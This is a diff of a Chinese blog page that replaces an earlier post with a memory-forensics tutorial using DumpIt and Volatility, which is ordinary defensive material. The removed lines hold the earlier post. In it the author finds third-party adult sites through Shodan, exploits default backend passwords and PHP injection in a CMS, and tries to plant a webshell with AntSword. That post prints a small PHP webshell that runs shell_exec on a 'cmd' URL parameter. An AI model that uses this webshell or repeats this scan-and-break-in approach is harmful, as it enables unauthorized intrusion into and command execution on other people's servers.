@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   
-  <title>某CMS测试 | 算了吧 Blog</title>
+  <title>内存取证学习 | 算了吧 Blog</title>
   
   
 
@@ -231,8 +231,8 @@ var _hmt = _hmt || [];
         
   
     <h1 class="title">
-      <a href="/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/">
-        某CMS测试
+      <a href="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/">
+        内存取证学习
       </a>
     </h1>
   
@@ -263,7 +263,7 @@ var _hmt = _hmt || [];
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2020-03-15</p>
+    <p>2020-03-25</p>
   </a>
 </div>
 
@@ -313,28 +313,65 @@ var _hmt = _hmt || [];
 
     <section class="article typo">
       <div class="article-entry" itemprop="articleBody">
-        <p>一次H站点测试。<br>没事的时候多在心里默念：佛祖释迦牟尼说人有八苦，分别是生、老、病、死、怨憎会、爱别离、五阴炽盛、求不得。八苦乃众生轮回六道所受之八种苦果。</p>
-<a id="more"></a>
-<h1 id="事件起因"><a href="#事件起因" class="headerlink" title="事件起因"></a>事件起因</h1><p><img src="/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/1.png" alt="img"></p>
-<p><img src="/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/2.png" alt="img"></p>
-<p>大晚上朋友辗转反侧难以入睡，大家都懂。奈何我已从良多年，只能借助互联网搜索引擎强大。怎知行业不好，基本都收费，想起当时看到的文章记得cms，shodan找了一下，交给朋友，朋友很是开心。</p>
-<p>但是我的内心久久不能平静，怎么能让祖国的栋梁如此？搞一波？</p>
-<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><p>因为忘了当时公众号的测试过程，无奈只能自己进行测试。</p>
-<p>下载下来cms发现挺有意思的，没有数据库，所有的配置都写在了PHP文件里面。</p>
-<p>那就直接尝试在后台写入phpinfo看看结果</p>
-<p>notepad搜索一波，发现首页中的进行了html实体。</p>
-<p><img src="/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/3.png" alt="img"></p>
-<p>最终确定可以在JS部分写入PHP,有点意思啊</p>
-<p><img src="/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/4.png" alt="img"></p>
-<h1 id="一波三折"><a href="#一波三折" class="headerlink" title="一波三折"></a>一波三折</h1><p>当我信誓旦旦的去shodan了dock之后。发现很多存在默认口令的情况。</p>
-<p>那还说啥了，直接上马吧。</p>
-<p>尼玛了，蚁剑居然报错了。</p>
-<p>本地没报错，测试站点居然报错了，这是什么情况？？身为WEB入门的我思考了一番，在尝试写入下面脚本中提示：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a = $_GET[<span class="string">"cmd"</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> shell_exec($a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span></span></pre></td></tr></table></figure>
+        <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>​    网络攻击内存化和网络犯罪隐遁化,使部分关键数字证据只存在于物理内存或暂存于页面交换文件中,这使得传统的基于文件系统的计算机取证不能有效应对.内存取证作为传统文件系统取证的重要补充,是计算机取证科学的重要组成部分,通过全面获取内存数据、详尽分析内存数据,并在此基础上提取与网络攻击或网络犯罪相关的数字证据,近年来,内存取证已赢得安全社区的持续关注,获得了长足的发展与广泛应用,在网络应急响应和网络犯罪调查中发挥着不可替代的作用.首先回顾了内存取证研究的起源和发展演化过程;其次介绍了操作系统内存管理关键机制;然后探讨了内存取证的数据获取和分析方法,归纳总结目前内存取证研究的最新技术;最后讨论了内存取证存在的问题、发展趋势和进一步的研究方向.</p>
+<p>​                                                                                    ——《内存取证研究与进展[J].软件学报,2015, 26(5): 1151-1172》</p>
+<h1 id="内存镜像"><a href="#内存镜像" class="headerlink" title="内存镜像"></a>内存镜像</h1><p>这里使用的内存镜像工具为DumpIt，工具本身是绿色免安装更适合在应急中实际应用。</p>
+<p>运行程序选择Y则会生成Dump文件。</p>
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/1.png" alt="img"></p>
+<h1 id="镜像分析"><a href="#镜像分析" class="headerlink" title="镜像分析"></a>镜像分析</h1><h2 id="镜像分析工具安装"><a href="#镜像分析工具安装" class="headerlink" title="镜像分析工具安装"></a>镜像分析工具安装</h2><p> 这里也是查找一下内存分析的工具。这里使用到的工具为volatility</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo apt-get install volatility</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">sudo pip nstall distorm3 yara pycrypto pil openpyxl ujson</span></pre></td></tr></table></figure>
 
-<p><img src="/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/5.png" alt="img"></p>
-<p>居然禁用了相关函数的使用？</p>
-<p>这样执行不了cmd命令就很鸡肋啊。</p>
+<p>在安装完成运行后和学习文章的博主遇到了同样的问题。找不到这个so文件。</p>
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/2.png" alt="img"></p>
+<p>话不都说，直接运行 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo find /  -name libyara.so</span></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/3.png" alt="img"></p>
+<p>我这里的路径为如上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo ln -s <span class="string">'你的路径'</span> /usr/lib/libyara.so</span></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/4.png" alt="img"></p>
+<p>这次可以了不报错了！我们准备开始学习了~</p>
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/5.png" alt="img"></p>
+<h2 id="相关命令与使用"><a href="#相关命令与使用" class="headerlink" title="相关命令与使用"></a>相关命令与使用</h2><h3 id="标识操作系统与架构"><a href="#标识操作系统与架构" class="headerlink" title="标识操作系统与架构"></a>标识操作系统与架构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">volatility -f <span class="string">'镜像'</span> imageinfo</span></pre></td></tr></table></figure>
+
+<p>​    -f就是引入file文件，使用imageinfo查看当前镜像系统相关信息。</p>
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/6.png" alt="img"></p>
+<h3 id="查看镜像端口"><a href="#查看镜像端口" class="headerlink" title="查看镜像端口"></a>查看镜像端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo volatility -f KOT-PC-20200324-054544.raw --profile=Win7SP0x64  netscan</span></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/9.png" alt="img"></p>
+<h3 id="查看镜像时登录用户"><a href="#查看镜像时登录用户" class="headerlink" title="查看镜像时登录用户"></a>查看镜像时登录用户</h3><p>我这里登录的是kot</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo volatility -f KOT-PC-20200324-054544.raw --profile=Win7SP0x64 printkey -K <span class="string">"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span></span></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/10.png" alt="img"></p>
+<h3 id="查看镜像用户"><a href="#查看镜像用户" class="headerlink" title="查看镜像用户"></a>查看镜像用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo volatility -f KOT-PC-20200324-054544.raw --profile=Win7SP0x64 printkey -Kprintkey -K <span class="string">"SAM\Domains\Account\Users\Names"</span></span></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/11.png" alt="img"></p>
+<h3 id="获取-IE-浏览器的使用情况"><a href="#获取-IE-浏览器的使用情况" class="headerlink" title="获取 IE 浏览器的使用情况"></a>获取 IE 浏览器的使用情况</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo volatility -f KOT-PC-20200324-054544.raw --profile=Win7SP0x64 iehistory</span></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/12.png" alt="img"></p>
+<h3 id="查看镜像时系统进程"><a href="#查看镜像时系统进程" class="headerlink" title="查看镜像时系统进程"></a>查看镜像时系统进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo volatility -f KOT-PC-20200324-054544.raw --profile=Win7SP0x64  pslist</span></pre></td></tr></table></figure>
+
+<p>命令大侄意思为：</p>
+<p>sudo volatility -f ‘镜像’ –profile=’系统信息’  pslist</p>
+<p>这里还可以使用pstree、psscan</p>
+<p>详细信息直接借用大佬的原话</p>
+<blockquote>
+<p>这是一个非常常用的插件，它有助于列出转储时运行的进程的详细信息。它示出了偏移量，过程名，过程ID（PID），该父进程ID（PPID），线程的数目，把手的数目，和日期/时间时，过程开始和退出。<br>pslist无法显示隐藏/终止进程。解决这个问题的插件是psscan，这个插件输出的内容会比pslist多得多。<br>pstree同样也是扫描进程的，但是是以进程树的形式出现的。</p>
+</blockquote>
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/7.png" alt="img"></p>
+<h3 id="确定打开的文件"><a href="#确定打开的文件" class="headerlink" title="确定打开的文件"></a>确定打开的文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo volatility -f KOT-PC-20200324-054544.raw --profile=Win7SP0x64  filescan</span></pre></td></tr></table></figure>
+
+<p>​    可以进行扫描当前镜像中的运行文件，这里由于我dump时镜像运行比较多，使用了grep命令。</p>
+<p><img src="/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/8.png" alt="img"></p>
+<p>配合使用获取内存中的文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo volatility -f KOT-PC-20200324-054544.raw --profile=Win7SP0x64 dumpfiles -Q  0x000000007e69e230 --dump-dir=.</span></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
+<p><a href="http://shaobaobaoer.cn/archives/693/memory-forensics-tool-volatility-usage-and-practice" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/693/memory-forensics-tool-volatility-usage-and-practice</a></p>
+</blockquote>
 
       </div>
       
@@ -347,10 +384,10 @@ var _hmt = _hmt || [];
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-03-15T02:31:47+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-03-25T02:51:57+08:00">
   <a class='notlink'>
     <i class="fas fa-clock" aria-hidden="true"></i>
-    <p>更新于 2020年3月15日</p>
+    <p>更新于 2020年3月25日</p>
   </a>
 </div>
 
@@ -358,9 +395,6 @@ var _hmt = _hmt || [];
       
         
           
-  
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB%E5%AD%A6%E4%B9%A0/" rel="nofollow"><i class="fas fa-tag" aria-hidden="true"></i><p>WEB学习</p></a></div>
-
 
         
       
@@ -372,7 +406,7 @@ var _hmt = _hmt || [];
       
         <a class="-mob-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer"
           
-          href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/&title=某CMS测试 | 算了吧 Blog&summary=一次H站点测试。没事的时候多在心里默念：佛祖释迦牟尼说人有八苦，分别是生、老、病、死、怨憎会、爱别离、五阴炽盛、求不得。八苦乃众生轮回六道所受之八种苦果。"
+          href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/&title=内存取证学习 | 算了吧 Blog&summary="
           
           >
           
@@ -384,7 +418,7 @@ var _hmt = _hmt || [];
       
         <a class="-mob-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer"
           
-          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/&title=某CMS测试 | 算了吧 Blog&summary=一次H站点测试。没事的时候多在心里默念：佛祖释迦牟尼说人有八苦，分别是生、老、病、死、怨憎会、爱别离、五阴炽盛、求不得。八苦乃众生轮回六道所受之八种苦果。"
+          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/&title=内存取证学习 | 算了吧 Blog&summary="
           
           >
           
@@ -394,7 +428,7 @@ var _hmt = _hmt || [];
       
     
       
-        <a class='qrcode' rel="external nofollow noopener noreferrer noopener" href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvElEQVR42u3a0W7iQAwFUP7/p3elvq2AcG2PQ1c6eUKUpnOmUsZc+/GIrz8/1/Pr68/nV36Hx8aFh4eH11r69e2eb11d4rt3rjfxej3RFuDh4eGt8fI/ljx7c2Syocl2v30fDw8P76u860Ni8ujPq2I8PDy8/4uXP/SvP3PqaMHDw8P7Lu/Yl/9g43qw9awFDw8Pr7OecgPsW69v6u/h4eHhrTX4e3Ft/vnmavHw8PAWeEksWy1/kxiiuimTlhgeHh7eBi8PaqvtqzzkrTbP8o3Aw8PD2+MlQUDy08lAwHx84cM98fDw8Ma8asRQDQvmEW2+TS+2DA8PD2+Bl8QBeaGcl7aTsLjcGMPDw8M7yqtGCb2IoXfP3mr/eY2Hh4e3wDsFqw4BVNtg1eMEDw8P707e2XZUbynVwYU8OMbDw8M7y6sGptU22CR06LXB8PDw8DZ4ySO7OoOQM6ql9uibAR4eHt4hXrXizocA8jGCQr3fqpPx8PDw9ni9WKG6uN5gwaghh4eHh7fAy8vofBHVoDY5PKpNODw8PLwN3iQyaA48FaPY3ka8iHHx8PDwjvJ6raZkO6pnVP670eGEh4eHt8CrhhFJBNCLDHqlfKHLh4eHh3eId2pcoNpgyyOMXmGNh4eHdw+vXKq2yty8rZWMYX0YI8DDw8O7ndcbBdgoxPP7f8ha8PDw8Ma8fMQq/6afFOi9wYVka94eD3h4eHiHeHmB2wsgqrNPj9YV/d/w8PDwFnjV46HXssrbYJM448VMGR4eHt4h3vxBn2/E9R9O3h8B8PDw8I7ykoXmAeteanIgksDDw8M7yqseBnlUMS+jm2EEHh4e3i/g9aLeahiRh7+FMBcPDw/vq7zkqOgV4iubgoeHh7fGy5tP8yMkDyDy4AMPDw/vTl61ATaPJ/KF5mHHsf4eHh4e3tVP/wKz7JKXZGWazQAAAABJRU5ErkJggg==' target="_blank">
+        <a class='qrcode' rel="external nofollow noopener noreferrer noopener" href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAADMUlEQVR42u3awY7iMBAEUP7/p2elPa00C6lyG4mYl9OIgeDnHJru8uMRXz9/r9ev/P7vv9fvT/0sXc/u83jHhY2NjX0T9trX/H5P+y2Td75e52sLNjY29qns10WrLSHt1rwGPHslL2bY2NjY2G0xS15vG5u1B4CNjY2N3f7Ez9uMfFyVfyM2Njb2N7OToVI+EsqXmw+P1r5xwywNGxsb++PZbdD7yX+/Md/GxsbG/kj2/LhMW2bykpa0FouHfrCxsbEPYudjnWTpa4P7tTihjYcfyZwJGxsb+4bstSMybaOSD/R3xQ8Xm46NjY19EDv/2CQkWAtl81Ah39yohmNjY2Pflp2MkNqCNwmMJyV2lHJjY2Nj35adj+knsMlYanI8qGhIsLGxsW/FbmPXPFrYFTDkZ2+K7cDGxsY+iN0O9NuRUB4A5EOotlgudjnY2NjYN2GvDej3lqVkQ+fr+U8rgo2NjX0EO2kq8oUm13wwNAmGi14KGxsb+ybsvS1HPtDP25U8vi22HhsbG/sg9q6B0eSwTlLq1mAXjwQbGxv7CHYblLaT9mQL2hFV8iSjrgsbGxv7CPausc6z+7QznBbZDp6wsbGxz2PPQ9x5idrVbOQNFTY2NvZJ7PnRmaRotUuZb3TROGFjY2MfwZ6M7PNwt4XNt+yilGJjY2Mfwd71s35tLNWGuzns4lFhY2NjH8duC1U7+p/HCe3GXawKGxsb+zj2o7zaEjJvRTZvIjY2NvZB7HcMlfL4dldjs/gAsLGxsQ9ltyXtffHwJEiIAgZsbGzsI9hJgWnHRvk9J0FCfjdsbGzss9lRLFqWijyybY/4tCH0hQgbGxv7CHZerlp2HiEksEn5xMbGxv4G9nw8lCw6aWnydmKtEG44hYSNjY39kez8ao/L5NuXxw9rResiD8HGxsa+LbsNdNeGTRNq2xqtNTDY2NjYd2e3cW9S3iZLz1c1KmDY2NjYx7HzkVM7QmqLX9v8rJVhbGxs7O9kt9HC2jHNtZXkd8DGxsbGXlv0WsCQbOjapmNjY2Ofx25v1FLnd84LYfTwsLGxsQ9irwW9LbgdOSURRVtQsbGxsY9j/wF3F4zgOH9aSAAAAABJRU5ErkJggg==' target="_blank">
         
           <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/wechat.png">
         
@@ -404,7 +438,7 @@ var _hmt = _hmt || [];
       
         <a class="-mob-share-weibo" title="微博" rel="external nofollow noopener noreferrer"
           
-          href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/&title=某CMS测试 | 算了吧 Blog&summary=一次H站点测试。没事的时候多在心里默念：佛祖释迦牟尼说人有八苦，分别是生、老、病、死、怨憎会、爱别离、五阴炽盛、求不得。八苦乃众生轮回六道所受之八种苦果。"
+          href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0/&title=内存取证学习 | 算了吧 Blog&summary="
           
           >
           
@@ -414,7 +448,7 @@ var _hmt = _hmt || [];
       
     
       
-        <a class='qrcode' rel="external nofollow noopener noreferrer noopener" href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvElEQVR42u3a0W7iQAwFUP7/p3elvq2AcG2PQ1c6eUKUpnOmUsZc+/GIrz8/1/Pr68/nV36Hx8aFh4eH11r69e2eb11d4rt3rjfxej3RFuDh4eGt8fI/ljx7c2Syocl2v30fDw8P76u860Ni8ujPq2I8PDy8/4uXP/SvP3PqaMHDw8P7Lu/Yl/9g43qw9awFDw8Pr7OecgPsW69v6u/h4eHhrTX4e3Ft/vnmavHw8PAWeEksWy1/kxiiuimTlhgeHh7eBi8PaqvtqzzkrTbP8o3Aw8PD2+MlQUDy08lAwHx84cM98fDw8Ma8asRQDQvmEW2+TS+2DA8PD2+Bl8QBeaGcl7aTsLjcGMPDw8M7yqtGCb2IoXfP3mr/eY2Hh4e3wDsFqw4BVNtg1eMEDw8P707e2XZUbynVwYU8OMbDw8M7y6sGptU22CR06LXB8PDw8DZ4ySO7OoOQM6ql9uibAR4eHt4hXrXizocA8jGCQr3fqpPx8PDw9ni9WKG6uN5gwaghh4eHh7fAy8vofBHVoDY5PKpNODw8PLwN3iQyaA48FaPY3ka8iHHx8PDwjvJ6raZkO6pnVP670eGEh4eHt8CrhhFJBNCLDHqlfKHLh4eHh3eId2pcoNpgyyOMXmGNh4eHdw+vXKq2yty8rZWMYX0YI8DDw8O7ndcbBdgoxPP7f8ha8PDw8Ma8fMQq/6afFOi9wYVka94eD3h4eHiHeHmB2wsgqrNPj9YV/d/w8PDwFnjV46HXssrbYJM448VMGR4eHt4h3vxBn2/E9R9O3h8B8PDw8I7ykoXmAeteanIgksDDw8M7yqseBnlUMS+jm2EEHh4e3i/g9aLeahiRh7+FMBcPDw/vq7zkqOgV4iubgoeHh7fGy5tP8yMkDyDy4AMPDw/vTl61ATaPJ/KF5mHHsf4eHh4e3tVP/wKz7JKXZGWazQAAAABJRU5ErkJggg==' target="_blank">
+        <a class='qrcode' rel="external nofollow noopener noreferrer noopener" href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAADMUlEQVR42u3awY7iMBAEUP7/p2elPa00C6lyG4mYl9OIgeDnHJru8uMRXz9/r9ev/P7vv9fvT/0sXc/u83jHhY2NjX0T9trX/H5P+y2Td75e52sLNjY29qns10WrLSHt1rwGPHslL2bY2NjY2G0xS15vG5u1B4CNjY2N3f7Ez9uMfFyVfyM2Njb2N7OToVI+EsqXmw+P1r5xwywNGxsb++PZbdD7yX+/Md/GxsbG/kj2/LhMW2bykpa0FouHfrCxsbEPYudjnWTpa4P7tTihjYcfyZwJGxsb+4bstSMybaOSD/R3xQ8Xm46NjY19EDv/2CQkWAtl81Ah39yohmNjY2Pflp2MkNqCNwmMJyV2lHJjY2Nj35adj+knsMlYanI8qGhIsLGxsW/FbmPXPFrYFTDkZ2+K7cDGxsY+iN0O9NuRUB4A5EOotlgudjnY2NjYN2GvDej3lqVkQ+fr+U8rgo2NjX0EO2kq8oUm13wwNAmGi14KGxsb+ybsvS1HPtDP25U8vi22HhsbG/sg9q6B0eSwTlLq1mAXjwQbGxv7CHYblLaT9mQL2hFV8iSjrgsbGxv7CPausc6z+7QznBbZDp6wsbGxz2PPQ9x5idrVbOQNFTY2NvZJ7PnRmaRotUuZb3TROGFjY2MfwZ6M7PNwt4XNt+yilGJjY2Mfwd71s35tLNWGuzns4lFhY2NjH8duC1U7+p/HCe3GXawKGxsb+zj2o7zaEjJvRTZvIjY2NvZB7HcMlfL4dldjs/gAsLGxsQ9ltyXtffHwJEiIAgZsbGzsI9hJgWnHRvk9J0FCfjdsbGzss9lRLFqWijyybY/4tCH0hQgbGxv7CHZerlp2HiEksEn5xMbGxv4G9nw8lCw6aWnydmKtEG44hYSNjY39kez8ao/L5NuXxw9rResiD8HGxsa+LbsNdNeGTRNq2xqtNTDY2NjYd2e3cW9S3iZLz1c1KmDY2NjYx7HzkVM7QmqLX9v8rJVhbGxs7O9kt9HC2jHNtZXkd8DGxsbGXlv0WsCQbOjapmNjY2Ofx25v1FLnd84LYfTwsLGxsQ9irwW9LbgdOSURRVtQsbGxsY9j/wF3F4zgOH9aSAAAAABJRU5ErkJggg==' target="_blank">
         
           <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qrcode.png">
         
@@ -436,36 +470,17 @@ var _hmt = _hmt || [];
       
           <div class="prev-next">
               
-                  <section class="prev">
-                      <span class="art-item-left">
-                          <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;上一页</h6>
-                          <h4>
-                              <a href="/2020/03/24/%E4%B8%8D%E5%81%A5%E5%BA%B7%E7%9A%84app%E6%B5%8B%E8%AF%95/" rel="prev" title="不健康的app测试">
-                                
-                                    不健康的app测试
-                                
-                              </a>
-                          </h4>
-                          
-                      </span>
-                  </section>
-              
               
                   <section class="next">
                       <span class="art-item-right" aria-hidden="true">
                           <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
                           <h4>
-                              <a href="/2020/02/25/0l4bs-XSS/" rel="prev" title="0l4bs XSS">
+                              <a href="/2020/03/24/%E4%B8%8D%E5%81%A5%E5%BA%B7%E7%9A%84app%E6%B5%8B%E8%AF%95/" rel="prev" title="不健康的app测试">
                                   
-                                      0l4bs XSS
+                                      不健康的app测试
                                   
                               </a>
                           </h4>
-                          
-                              
-                              <h6 class="tags">
-                                  <a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/"><i class="fas fa-tag fa-fw" aria-hidden="true"></i> 靶场记录</a>
-                              </h6>
                           
                       </span>
                   </section>
@@ -494,7 +509,7 @@ var _hmt = _hmt || [];
 
   <script>
     window.subData = {
-      title: '某CMS测试',
+      title: '内存取证学习',
       tools: true
     }
   </script>
@@ -608,7 +623,7 @@ var _hmt = _hmt || [];
 </header>
 
     <div class='content pure'>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#事件起因"><span class="toc-text">事件起因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#测试过程"><span class="toc-text">测试过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一波三折"><span class="toc-text">一波三折</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#介绍"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内存镜像"><span class="toc-text">内存镜像</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#镜像分析"><span class="toc-text">镜像分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#镜像分析工具安装"><span class="toc-text">镜像分析工具安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关命令与使用"><span class="toc-text">相关命令与使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#标识操作系统与架构"><span class="toc-text">标识操作系统与架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看镜像端口"><span class="toc-text">查看镜像端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看镜像时登录用户"><span class="toc-text">查看镜像时登录用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看镜像用户"><span class="toc-text">查看镜像用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取-IE-浏览器的使用情况"><span class="toc-text">获取 IE 浏览器的使用情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看镜像时系统进程"><span class="toc-text">查看镜像时系统进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#确定打开的文件"><span class="toc-text">确定打开的文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     </div>
   </section>
 
